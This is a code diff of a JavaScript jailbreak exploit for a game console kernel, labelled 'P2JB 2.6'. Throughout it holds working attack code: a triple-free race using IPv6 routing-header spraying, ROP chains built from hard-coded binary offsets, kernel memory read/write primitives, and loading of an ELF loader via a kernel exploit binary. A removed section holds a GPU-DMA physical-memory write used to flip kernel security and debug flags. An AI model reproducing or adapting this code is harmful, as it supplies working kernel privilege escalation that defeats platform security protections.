+            syscall(SYSCALL.close, fd);
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    function write_file(path, text) {
+        const mode = 0x1ffn; // 777
+        const path_addr = alloc_string(path);
+        const data_addr = alloc_string(text);
+
+        const flags = O_CREAT | O_WRONLY | O_TRUNC;
+        const fd = syscall(SYSCALL.open, path_addr, flags, mode);
+
+        if (fd === 0xffffffffffffffffn) {
+            throw new Error("open failed for " + path + " fd: " + hex(fd));
+        }
+
+        const written = syscall(SYSCALL.write, fd, data_addr, BigInt(text.length));
+        if (written === 0xffffffffffffffffn) {
+            syscall(SYSCALL.close, fd);
+            throw new Error("write failed : " + hex(written));
+        }
+
+        syscall(SYSCALL.close, fd);
+        return Number(written); // number of bytes written
+    }
+
     try {
         const p2jb_version = "P2JB 2.6 (Y2JB -> NFJB port by wodz69)";
 
@@ -824,8 +195,6 @@ function update_kernel_offsets() {
 
         const LEAK_CORES = [0, 1];
 
-        const ENABLE_DEBUG_MENU = true;
-
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
             socketpair: 0x87n,
@@ -838,6 +207,18 @@ function update_kernel_offsets() {
         for (const k in SYSCALL_EXTRA) {
             if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
         }
+
+        function make_state() {
+            return {
+                triplets: [-1, -1, -1],
+                free_fds: [],
+                free_fd_idx: 0,
+                active_uio_mode: 0,
+                OFF: null,
+            };
+        }
+
+        var S = make_state();
 
         const FW_OFFSETS_P2JB = {
             "9.00": {
@@ -930,7 +311,21 @@ function update_kernel_offsets() {
                 DATA_BASE_QA_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x24n : null,
                 DATA_BASE_UTOKEN_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x8Cn : null,
             };
+
+            S.OFF = kernel_offset;
         }
+
+        let ROP = {
+            get pop_rsp()             { return g.get('pop_rsp');               },
+            get pop_rax()             { return g.get('pop_rax');               },
+            get pop_rdi()             { return g.get('pop_rdi');               },
+            get pop_rsi()             { return g.get('pop_rsi');               },
+            get pop_rdx()             { return g.get('pop_rdx');               },
+            get pop_rcx()             { return g.get('pop_rcx');               },
+            get pop_r8()              { return g.get('pop_r8');                },
+            get ret()                 { return g.get('ret');                   },
+            get mov_qword_rdi_rax()   { return g.get('mov_qword_ptr_rdi_rax'); },
+        };
 
         let saved_fpu_ctrl = 0;
         let saved_mxcsr = 0;
@@ -945,9 +340,6 @@ function update_kernel_offsets() {
         }
 
         function spawn_leak_worker(chain_addr) {
-            // Zero a scratch buffer and fill all jmpbuf slots with it so callee-saved
-            // registers (RBX, RBP, R12-R15) have a valid pointer after longjmp, not
-            // uninitialized malloc garbage that would fault on first use.
             const scratch = malloc(0x100);
             for (let i = 0; i < 0x100; i += 8) write64_uncompressed(scratch + BigInt(i), 0n);
             const jb = malloc(0x60);
@@ -960,8 +352,6 @@ function update_kernel_offsets() {
 
             const stack_size = 0x400n;
             const tls_size = 0x40n;
-            // Zero thr_new_args so flags[0x40] and rtp[0x48] are 0, not garbage that
-            // could set THR_SUSPENDED or cause a kernel dereference of a junk rtp pointer.
             const thr_new_args = malloc(0x80);
             for (let i = 0; i < 0x80; i += 8) write64_uncompressed(thr_new_args + BigInt(i), 0n);
             const tid_addr = malloc(0x8);
@@ -990,7 +380,7 @@ function update_kernel_offsets() {
             const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
 
             // Allocate the chain buffer and keep the ArrayBuffer reference so we can
-            // write gadgets via a BigUint64Array view, bypassing write64_uncompressed, avoiding gc
+            // write gadgets via a BigUint64Array view, bypassing write64_uncompressed, minimizing gc pressure
             const buf = malloc(STACK_SIZE);
             const chain_ab = allocated_buffers[allocated_buffers.length - 1];
             const chain_view = new BigUint64Array(chain_ab);
@@ -1103,10 +493,12 @@ function update_kernel_offsets() {
             write8_uncompressed(buf + 3n, BigInt(len >> 1));
             return actual_size;
         }
+
         function set_rthdr(sd, buf, len) {
             return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR,
                 buf, BigInt(len));
         }
+
         function free_rthdr(sd) {
             return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
         }
@@ -1312,16 +704,6 @@ function update_kernel_offsets() {
             };
         }
 
-        function make_state() {
-            return {
-                triplets: [-1, -1, -1],
-                free_fds: [],
-                free_fd_idx: 0,
-                active_uio_mode: 0,
-                OFF: kernel_offset,
-            };
-        }
-
         function setup_cpu_masks(S) {
             S.cpu_mask = malloc(16);
             for (let i = 0; i < 16; i++) write8_uncompressed(S.cpu_mask + BigInt(i), 0n);
@@ -1352,52 +734,6 @@ function update_kernel_offsets() {
             for (let i = 0; i < 16; i++) write8_uncompressed(mask + BigInt(i), 0n);
             write16_uncompressed(mask, BigInt(1 << core));
             syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
-        }
-
-        function get_current_ip() {
-            // Get interface count
-            const count = Number(syscall(SYSCALL.netgetiflist, 0n, 10n));
-            if (count < 0) {
-                return null;
-            }
-
-            // Allocate buffer for interfaces
-            const iface_size = 0x1e0;
-            const iface_buf = malloc(iface_size * count);
-
-            // Get interface list
-            if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
-                return null;
-            }
-
-            // Parse interfaces
-            for (let i = 0; i < count; i++) {
-                const offset = BigInt(i * iface_size);
-
-                // Read interface name (null-terminated string at offset 0)
-                let iface_name = "";
-                for (let j = 0; j < 16; j++) {
-                    const c = Number(read8_uncompressed(iface_buf + offset + BigInt(j)));
-                    if (c === 0) break;
-                    iface_name += String.fromCharCode(c);
-                }
-
-                // Read IP address (4 bytes at offset 0x28)
-                const ip_offset = offset + 0x28n;
-                const ip1 = Number(read8_uncompressed(iface_buf + ip_offset));
-                const ip2 = Number(read8_uncompressed(iface_buf + ip_offset + 1n));
-                const ip3 = Number(read8_uncompressed(iface_buf + ip_offset + 2n));
-                const ip4 = Number(read8_uncompressed(iface_buf + ip_offset + 3n));
-                const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
-
-                // Check if this is eth0 or wlan0 with valid IP
-                if ((iface_name === "eth0" || iface_name === "wlan0") &&
-                    iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
-                    return iface_ip;
-                }
-            }
-
-            return null;
         }
 
         function setup_worker_sockets(S) {
@@ -1532,7 +868,9 @@ function update_kernel_offsets() {
         function rthdr_set(S, idx) {
             return set_rthdr(S.ipv6_sockets[idx], S.rthdr_spray, S.rthdr_spray_len);
         }
+
         function rthdr_free_idx(S, idx) { return free_rthdr(S.ipv6_sockets[idx]); }
+
         function rthdr_get_tag(S, idx) {
             write32_uncompressed(S.tag_len, 8n);
             const r = syscall(SYSCALL.getsockopt,
@@ -1604,6 +942,11 @@ function update_kernel_offsets() {
         }
 
         function prepare_fds(S) {
+
+            if (failcheck_path) {
+                try { write_file(failcheck_path, ""); } catch (_) { }
+            }
+
             const rl = malloc(16);
             syscall(0xC2n, 8n, rl);
             const nofile_hard = read64_uncompressed(rl + 8n);
@@ -1657,7 +1000,7 @@ function update_kernel_offsets() {
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
-            const LEAK_UNROLL = 1024;
+            const LEAK_UNROLL = 512;
             const U = BigInt(LEAK_UNROLL);
 
             const NW = LEAK_CORES.length;
@@ -1695,7 +1038,6 @@ function update_kernel_offsets() {
             write64_uncompressed(_sleep_ts,      5n);           // tv_sec  = 5
             write64_uncompressed(_sleep_ts + 8n, 0n);           // tv_nsec = 0
 
-            logger.log("prepare_fds: beginning feeding");
             _cr_enable_caching();
 
             let all_fed = false;
@@ -1717,13 +1059,12 @@ function update_kernel_offsets() {
 
             _cr_disable_caching();
 
-
-            logger.log("feeding done, waiting for workers to finish");
+            // logger.log("feeding done, waiting for workers to finish");
 
             for (const lw of lws) {
                 while (true) {
                     write64_uncompressed(lw.finished, 0n);
-                    nanosleep_ms(1500);
+                    nanosleep_ms(3000);
                     if (read64_uncompressed(lw.finished) === 0n) break;
                 }
             }
@@ -1820,9 +1161,6 @@ function update_kernel_offsets() {
         function stage0(S) {
             logger.log("Stage 0\nTriple-free race");
 
-            // if (failcheck_path) {
-            //     try { write_file(failcheck_path, ""); } catch (_) { }
-            // }
             for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                 if (attempt_race(S)) {
                     logger.log("stage0: triplets " + S.triplets.join(",") +
@@ -2380,12 +1718,6 @@ function update_kernel_offsets() {
                     "menu and the elf loader. The jailbreak is complete.");
                 return;
             }
-
-            if (ENABLE_DEBUG_MENU) {
-                stage_debug_menu(S);
-            } else {
-                logger.log("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
-            }
         }
 
        function stage7(S) {
@@ -2425,371 +1757,7 @@ function update_kernel_offsets() {
             send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");
         }
 
-        const GPU_PDE_SHIFT = { VALID: 0, IS_PTE: 54, TF: 56, BLOCK_FRAGMENT_SIZE: 59 };
-        const GPU_PDE_MASKS = { VALID: 1n, IS_PTE: 1n, TF: 1n, BLOCK_FRAGMENT_SIZE: 0x1fn };
-        const GPU_PDE_ADDR_MASK = 0x0000ffffffffffc0n;
-
-        function gpu_pde_field(pde, field) {
-            return (pde >> BigInt(GPU_PDE_SHIFT[field])) & GPU_PDE_MASKS[field];
-        }
-
-        function gpu_walk_pt(vmid, virt_addr) {
-            const pdb2_addr = get_pdb2_addr(vmid);
-            const pml4e_index = (virt_addr >> 39n) & 0x1ffn;
-            const pdpe_index = (virt_addr >> 30n) & 0x1ffn;
-            const pde_index = (virt_addr >> 21n) & 0x1ffn;
-
-            const pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8n);
-            if (gpu_pde_field(pml4e, "VALID") !== 1n) return null;
-
-            const pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK;
-            const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
-            const pdpe = kernel.read_qword(pdpe_va);
-            if (gpu_pde_field(pdpe, "VALID") !== 1n) return null;
-
-            const pd_base_pa = pdpe & GPU_PDE_ADDR_MASK;
-            const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
-            const pde = kernel.read_qword(pde_va);
-            if (gpu_pde_field(pde, "VALID") !== 1n) return null;
-            if (gpu_pde_field(pde, "IS_PTE") === 1n) return [pde_va, 0x200000n];
-
-            const fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE");
-            const offset = virt_addr & 0x1fffffn;
-            const pt_base_pa = pde & GPU_PDE_ADDR_MASK;
-            let pte_index, pte, pte_va, page_size;
-
-            if (fragment_size === 4n) {
-                pte_index = offset >> 16n;
-                pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
-                pte = kernel.read_qword(pte_va);
-                if (gpu_pde_field(pte, "VALID") === 1n && gpu_pde_field(pte, "TF") === 1n) {
-                    pte_index = (virt_addr & 0xffffn) >> 13n;
-                    pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
-                    page_size = 0x2000n;
-                } else {
-                    page_size = 0x10000n;
-                }
-            } else if (fragment_size === 1n) {
-                pte_index = offset >> 13n;
-                pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
-                page_size = 0x2000n;
-            }
-            return [pte_va, page_size];
-        }
-
-        let gpu = {};
-        gpu.dmem_size = 2n * 0x100000n;
-        gpu.fd = null;
-
-        gpu.build_command_descriptor = function (gpu_addr, size_in_bytes) {
-            const desc = malloc(16);
-            const size_in_dwords = BigInt(size_in_bytes) >> 2n;
-            const qword0 = ((gpu_addr & 0xFFFFFFFFn) << 32n) | 0xC0023F00n;
-            const qword1 = ((size_in_dwords & 0xFFFFFn) << 32n) | ((gpu_addr >> 32n) & 0xFFFFn);
-            write64_uncompressed(desc, qword0);
-            write64_uncompressed(desc + 8n, qword1);
-            return desc;
-        };
-
-        gpu.ioctl_submit_commands = function (pipe_id, cmd_count, cmd_descriptors_ptr) {
-            const submit_struct = malloc(0x10);
-            write32_uncompressed(submit_struct + 0x0n, BigInt(pipe_id));
-            write32_uncompressed(submit_struct + 0x4n, BigInt(cmd_count));
-            write64_uncompressed(submit_struct + 0x8n, cmd_descriptors_ptr);
-            const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0108102n, submit_struct);
-            if (ret !== 0n) throw new Error("ioctl submit failed: " + toHex(ret));
-        };
-
-        gpu.setup = function () {
-            gpu.fd = syscall(SYSCALL.open, alloc_string("/dev/gc"), O_RDWR);
-            if (gpu.fd === 0xffffffffffffffffn) throw new Error("Failed to open /dev/gc");
-
-            const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
-            const prot_rw = prot_ro | GPU_WRITE;
-
-            const victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
-            const transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
-            const cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
-
-            const curproc_cr3 = get_proc_cr3(kernel.addr.curproc);
-            kernel.addr.proc_cr3 = curproc_cr3;
-
-            logger.log("gpu.setup: victim_va " + victim_va + " curproc_cr3 " + curproc_cr3);
-
-            const victim_real_pa = virt_to_phys(victim_va, curproc_cr3);
-
-            logger.log("gpu.setup: victim_real_pa " + victim_real_pa);
-
-            const result = get_ptb_entry_of_relative_va(victim_va);
-            if (!result) throw new Error("failed to setup gpu primitives");
-            const [victim_ptbe_va, page_size] = result;
-            if (!victim_ptbe_va || page_size !== gpu.dmem_size)
-                throw new Error("failed to setup gpu primitives");
-
-            if (syscall(SYSCALL.mprotect, victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn)
-                throw new Error("mprotect() error");
-
-            const initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va);
-            const cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & (~victim_real_pa);
-
-            gpu.victim_va = victim_va;
-            gpu.transfer_va = transfer_va;
-            gpu.cmd_va = cmd_va;
-            gpu.victim_ptbe_va = victim_ptbe_va;
-            gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro;
-        };
-
-        gpu.pm4_type3_header = function (opcode, count) {
-            const packet_type = 3n;
-            const shader_type = 1n;
-            const predicate = 0n;
-            const result = (
-                (predicate & 0x0n) |
-                ((shader_type & 0x1n) << 1n) |
-                ((opcode & 0xffn) << 8n) |
-                (((count - 1n) & 0x3fffn) << 16n) |
-                ((packet_type & 0x3n) << 30n)
-            );
-            return result & 0xFFFFFFFFn;
-        };
-
-        gpu.pm4_dma_data = function (dest_va, src_va, length) {
-            const count = 6n;
-            const bufsize = Number(4n * (count + 1n));
-            const opcode = 0x50n;
-            const command_len = BigInt(length) & 0x1fffffn;
-            const pm4 = malloc(bufsize);
-
-            const dma_data_header = (
-                (0n & 0x1n) |
-                ((0n & 0x1n) << 12n) |
-                ((2n & 0x3n) << 13n) |
-                ((1n & 0x1n) << 15n) |
-                ((0n & 0x3n) << 20n) |
-                ((0n & 0x1n) << 24n) |
-                ((2n & 0x3n) << 25n) |
-                ((1n & 0x1n) << 27n) |
-                ((0n & 0x3n) << 29n) |
-                ((1n & 0x1n) << 31n)
-            ) & 0xFFFFFFFFn;
-
-            write32_uncompressed(pm4, gpu.pm4_type3_header(opcode, count));
-            write32_uncompressed(pm4 + 0x4n, dma_data_header);
-            write32_uncompressed(pm4 + 0x8n, src_va & 0xFFFFFFFFn);
-            write32_uncompressed(pm4 + 0xcn, src_va >> 32n);
-            write32_uncompressed(pm4 + 0x10n, dest_va & 0xFFFFFFFFn);
-            write32_uncompressed(pm4 + 0x14n, dest_va >> 32n);
-            write32_uncompressed(pm4 + 0x18n, command_len);
-            return read_buffer(pm4, bufsize);
-        };
-
-        gpu.submit_dma_data_command = function (dest_va, src_va, size) {
-            const dma_data = gpu.pm4_dma_data(dest_va, src_va, size);
-            write_buffer(gpu.cmd_va, dma_data);
-            const desc = gpu.build_command_descriptor(gpu.cmd_va, dma_data.length);
-            gpu.ioctl_submit_commands(0, 1, desc);
-            nanosleep_ms(500);
-        };
-
-        gpu.transfer_physical_buffer = function (phys_addr, size, is_write) {
-            const trunc_phys_addr = phys_addr & ~(gpu.dmem_size - 1n);
-            const offset = phys_addr - trunc_phys_addr;
-            if (offset + BigInt(size) > gpu.dmem_size)
-                throw new Error("transfer beyond direct memory size: " + size);
-
-            const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
-            const prot_rw = prot_ro | GPU_WRITE;
-
-            if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn)
-                throw new Error("mprotect() error");
-
-            const new_ptb = gpu.cleared_victim_ptbe_for_ro | trunc_phys_addr;
-            kernel.write_qword(gpu.victim_ptbe_va, new_ptb);
-
-            if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_rw) === 0xffffffffffffffffn)
-                throw new Error("mprotect() error");
-
-            let src, dst;
-            if (is_write) { src = gpu.transfer_va; dst = gpu.victim_va + offset; }
-            else { src = gpu.victim_va + offset; dst = gpu.transfer_va; }
-
-            gpu.submit_dma_data_command(dst, src, size);
-        };
-
-        gpu.write_buffer = function (addr, buf) {
-            const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
-            if (!phys_addr) throw new Error("v2p failed for " + toHex(addr));
-            write_buffer(gpu.transfer_va, buf);
-            gpu.transfer_physical_buffer(phys_addr, buf.length, true);
-        };
-
-        gpu.write_byte = function (dest, value) {
-            const buf = new Uint8Array(1);
-            buf[0] = Number(value & 0xFFn);
-            gpu.write_buffer(dest, buf);
-        };
-        gpu.write_dword = function (dest, value) {
-            const buf = new Uint8Array(4);
-            for (let i = 0; i < 4; i++) buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
-            gpu.write_buffer(dest, buf);
-        };
-
-        function alloc_main_dmem(size, prot, flag) {
-            const out = malloc(8);
-            const mem_type = 1n;
-            const size_big = typeof size === "bigint" ? size : BigInt(size);
-            const prot_big = typeof prot === "bigint" ? prot : BigInt(prot);
-            const flag_big = typeof flag === "bigint" ? flag : BigInt(flag);
-            const ret = call(sceKernelAllocateMainDirectMemory, size_big, size_big, mem_type, out);
-            if (ret !== 0n)
-                throw new Error("sceKernelAllocateMainDirectMemory() error: " + toHex(ret));
-            const phys_addr = read64_uncompressed(out);
-            write64_uncompressed(out, 0n);
-            const name_buf = alloc_string("mem");
-            //const ret2 = call(sceKernelMapNamedDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big, name_buf);
-            const ret2 = call(sceKernelMapDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big);
-            if (ret2 !== 0n) {
-                throw new Error("sceKernelMapDirectMemory() error: " + hex(ret2));
-            }
-            return read64_uncompressed(out);
-        }
-
-        function get_curproc_vmid() {
-            const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
-            const vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID);
-            return Number(vmid);
-        }
-
-        function get_gvmspace(vmid) {
-            const vmid_big = typeof vmid === "bigint" ? vmid : BigInt(vmid);
-            const gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE;
-            return gvmspace_base + vmid_big * kernel_offset.SIZEOF_GVMSPACE;
-        }
-
-        function get_pdb2_addr(vmid) {
-            return kernel.read_qword(get_gvmspace(vmid) + kernel_offset.GVMSPACE_PAGE_DIR_VA);
-        }
-
-        function get_relative_va(vmid, va) {
-            if (typeof va !== "bigint") throw new Error("va must be BigInt");
-            const gvmspace = get_gvmspace(vmid);
-            const size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE);
-            const start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA);
-            const end_addr = start_addr + size;
-            if (va >= start_addr && va < end_addr) return va - start_addr;
-            return null;
-        }
-
-        function get_ptb_entry_of_relative_va(virt_addr) {
-            const vmid = get_curproc_vmid();
-            const relative_va = get_relative_va(vmid, virt_addr);
-            if (!relative_va)
-                throw new Error("invalid virtual addr " + toHex(virt_addr) + " for vmid " + vmid);
-            return gpu_walk_pt(vmid, relative_va);
-        }
-
-
-         function stage_debug_menu(S) {
-            logger.log("stage_debug_menu: entered");
-
-            if (!ENABLE_DEBUG_MENU) {
-                logger.log("stage_debug_menu disabled");
-                return;
-            }
-
-            const O = S.OFF;
-            try {
-                if (!O.DATA_BASE_SECURITY_FLAGS || !O.DATA_BASE_KERNEL_PMAP_STORE ||
-                    !O.DATA_BASE_GVMSPACE) {
-                    logger.log("stage_debug_menu: per-FW offsets missing for " + FW_VERSION +
-                        " - skipping debug menu");
-                    return;
-                }
-                if (!S.data_base || !S.curproc) {
-                    logger.log("stage_debug_menu: data_base/curproc missing - skipped");
-                    return;
-                }
-
-               kernel.read_buffer = (kaddr, size) => {
-                    S.kread(S.scratch_big, BigInt(kaddr), Number(size));
-                    return read_buffer(S.scratch_big, Number(size));
-                };
-                kernel.write_buffer = (kaddr, buf) => {
-                    write_buffer(S.scratch_big, buf);
-                    S.kwrite(BigInt(kaddr), S.scratch_big, buf.length);
-                };
-                kernel.addr.curproc = S.curproc;
-                kernel.addr.data_base = S.data_base;
-
-                const pmap_store = S.data_base + O.DATA_BASE_KERNEL_PMAP_STORE;
-                const pml4 = S.kread64(pmap_store + O.PMAP_PML4);
-                const cr3 = S.kread64(pmap_store + O.PMAP_CR3);
-                const dmap_base = pml4 - cr3;
-                logger.log("stage_debug_menu: pmap_store=" + toHex(pmap_store) +
-                    " pml4=" + toHex(pml4) + " cr3=" + toHex(cr3) +
-                    " dmap_base=" + toHex(dmap_base));
-
-                const cr3_ok = cr3 !== 0n && (cr3 & 0xFFFn) === 0n && cr3 < 0x800000000n;
-                const dmap_ok = (dmap_base >> 48n) === 0xFFFFn && (dmap_base & 0xFFFn) === 0n;
-                if (!cr3_ok || !dmap_ok) {
-                    logger.log("stage_debug_menu: pmap/dmap WRONG for FW " + FW_VERSION +
-                        " (cr3_ok=" + cr3_ok + " dmap_ok=" + dmap_ok +
-                        ") - DATA_BASE_KERNEL_PMAP_STORE likely incorrect; skipped");
-                    return;
-                }
-                kernel.addr.kernel_cr3 = cr3;
-                kernel.addr.dmap_base = dmap_base;
-
-                update_kernel_offsets();
-                logger.log("stage_debug_menu: `VMSPACE_VM_PMAP`=" +
-                    toHex(kernel_offset.VMSPACE_VM_PMAP) + " VM_VMID=" +
-                    toHex(kernel_offset.VMSPACE_VM_VMID) + " PROC_COMM=" +
-                    toHex(kernel_offset.PROC_COMM));
-
-                gpu.setup();
-                logger.log("stage_debug_menu: gpu.setup() ok - GPU-DMA write primitive ready");
-
-                const sf_addr = S.data_base + O.DATA_BASE_SECURITY_FLAGS;
-                const tid_addr = S.data_base + O.DATA_BASE_TARGET_ID;
-                const qa_addr = S.data_base + O.DATA_BASE_QA_FLAGS;
-                const ut_addr = S.data_base + O.DATA_BASE_UTOKEN_FLAGS;
-
-                const sf0 = kernel.read_dword(sf_addr);
-                logger.log("stage_debug_menu: security_flags before=" + toHex(sf0));
-                gpu.write_dword(sf_addr, sf0 | 0x14n);
-                const sf = kernel.read_dword(sf_addr);
-                logger.log("stage_debug_menu: security_flags after=" + toHex(sf));
-
-                const tid0 = kernel.read_byte(tid_addr);
-                logger.log("stage_debug_menu: target_id before=" + toHex(tid0));
-                gpu.write_byte(tid_addr, 0x82n);
-                const tid = kernel.read_byte(tid_addr);
-                logger.log("stage_debug_menu: target_id after=" + toHex(tid));
-
-                const qa0 = kernel.read_dword(qa_addr);
-                logger.log("stage_debug_menu: qa_flags before=" + toHex(qa0));
-                gpu.write_dword(qa_addr, qa0 | 0x10300n);
-                const qa = kernel.read_dword(qa_addr);
-                logger.log("stage_debug_menu: qa_flags after=" + toHex(qa));
-
-                const ut0 = kernel.read_byte(ut_addr);
-                logger.log("stage_debug_menu: utoken_flags before=" + toHex(ut0));
-                gpu.write_byte(ut_addr, ut0 | 0x1n);
-                const ut = kernel.read_byte(ut_addr);
-                logger.log("stage_debug_menu: utoken_flags after=" + toHex(ut));
-
-                const ok = ((sf & 0x14n) === 0x14n) && ((tid & 0xffn) === 0x82n) &&
-                    ((qa & 0x10300n) === 0x10300n) && ((ut & 0x1n) === 0x1n);
-                logger.log("stage_debug_menu: " +
-                    (ok ? "=> DEBUG MENU ENABLED" : "=> verify FAILED"));
-            } catch (e) {
-                logger.log("stage_debug_menu: GPU debug-menu path failed: " + e.message +
-                    " (jailbreak unaffected)");
-            }
-        }
-
-        function force_td_ucred_migrate(S) {
-
+        function post_jb_migrate_ucred(S) {
             // post-jb KP fixes (ported from new p2jb)
             try {
                 const B = S.proc_ucred;
@@ -2888,13 +1856,149 @@ function update_kernel_offsets() {
                 logger.log("post-jb pin: failed: " + e.message +
                     " (jailbreak unaffected, close-KP may still fire)");
             }
+        }
 
+        function stage_elfldr_via_kexp(S) {
+            // Load and run kexp via thr_new syscall instead of pthread_create (crashes on FW 10.x)
+            // "borrow" TLS of the calling thread to allow malloc/free to work
+            logger.log("stage_elfldr_via_kexp");
+
+            allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;
+
+            var kexp_file_name = "kexp_no_pthreads.bin";
+            var kexp_data = malloc(32 * 1024);
+            var kexp_size = fetch_file(kexp_file_name, kexp_data, 32 * 1024);
+            logger.log("stage_elfldr_via_kexp: loaded " + kexp_file_name + " size=" + kexp_size + " bytes");
+
+            if (kexp_size < 1000) throw new Error("stage_elfldr_via_kexp: failed to load " + kexp_file_name);
+
+            var kexp_aligned = (BigInt(kexp_size) + 0x3FFFn) & ~0x3FFFn;
+            var kexp_shmfd = syscall(SYSCALL.jitshm_create, 0n, kexp_aligned, 0x7n);
+            var kexp_entry = syscall(SYSCALL.mmap, 0n, kexp_aligned, 0x7n, 0x1n, kexp_shmfd, 0n);
+
+            for (var i = 0n; i < BigInt(kexp_size); i++)
+                write8_uncompressed(kexp_entry + i, read8_uncompressed(kexp_data + i));
+
+            var kexp_args = malloc(0x30);
+            var kexp_flag = malloc(8);
+            var kexp_tid = malloc(8);
+
+            // ROP gadgets
+            var kexp_setjmp = read64_uncompressed(eboot_base + 0x241f5f0n);
+            var kexp_longjmp = read64_uncompressed(eboot_base + 0x241f5f8n);
+            var kexp_tmp_jb = malloc(0x60);
+            call(kexp_setjmp, kexp_tmp_jb, 0n);
+            var kexp_fpu = read32_uncompressed(kexp_tmp_jb + 0x40n);
+            var kexp_mxcsr = read32_uncompressed(kexp_tmp_jb + 0x44n);
+
+            var kexp_RET = eboot_base + 0x42n;
+            var kexp_POP_RDI = eboot_base + 0x1a729bn;
+            var kexp_POP_RAX = eboot_base + 0x6c233n;
+            var kexp_MOV_RDI_RAX = eboot_base + 0x1dcba9n;
+
+            // Stack + chain buffer (mmap'd for large size)
+            var STACK_SIZE = 0x80000 + 0x200 * 8;
+            var kexp_stack = syscall(SYSCALL.mmap, 0n, BigInt(STACK_SIZE), 0x3n, 0x1002n, 0xFFFFFFFFn, 0n);
+            logger.log("stack mmap @ " + hex(kexp_stack));
+            var kexp_chain = kexp_stack + 0x80000n;
+
+            // Scratch + jmpbuf
+            var kexp_scratch = malloc(0x100);
+            var kexp_jb = malloc(0x60);
+
+            // thr_param
+            var kexp_thr_param = malloc(0x68);
+
+            logger.log("kexp state initialized");
+
+            const ELFLDR_NAME = "elfldr-ps5.elf";
+
+            var elfldr_buf  = malloc(400 * 1024);
+            var elfldr_size = fetch_file(ELFLDR_NAME, elfldr_buf, 400 * 1024);
+            if (!elfldr_size || elfldr_size < 1000) {
+                logger.log("fetch elfldr: proxy fetch failed for " + ELFLDR_NAME + " (got " + elfldr_size + " bytes)");
+                throw new Error("fetch elfldr: proxy fetch failed for " + ELFLDR_NAME);
+            }
+            logger.log("stage_elfldr: elfldr fetched " + elfldr_size + " bytes");
+
+            write32_uncompressed(kexp_args + 0x00n, BigInt(S.master_rfd));
+            write32_uncompressed(kexp_args + 0x04n, BigInt(S.master_wfd));
+            write32_uncompressed(kexp_args + 0x08n, BigInt(S.victim_rfd));
+            write32_uncompressed(kexp_args + 0x0Cn, BigInt(S.victim_wfd));
+            write64_uncompressed(kexp_args + 0x10n, allproc);
+            write64_uncompressed(kexp_args + 0x18n, elfldr_buf);
+            write64_uncompressed(kexp_args + 0x20n, BigInt(elfldr_size));
+            logger.log("kexp args: pipes=[" + S.master_rfd + "," + S.master_wfd +
+                "," + S.victim_rfd + "," + S.victim_wfd +
+                "] allproc=" + hex(allproc) + " elfldr=" + hex(elfldr_buf) + " size=" + elfldr_size);
+
+            write64_uncompressed(kexp_flag, 0n);
+
+            // Zero stack padding
+            for (var k = 0n; k < 0x80000n; k += 8n) write64_uncompressed(kexp_stack + k, 0n);
+
+            // Build ROP chain
+            var ci = 0n;
+            write64_uncompressed(kexp_chain + ci, kexp_RET); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, kexp_RET); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, kexp_POP_RDI); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, kexp_args); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, kexp_entry); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, kexp_POP_RDI); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, kexp_flag); ci += 8n;
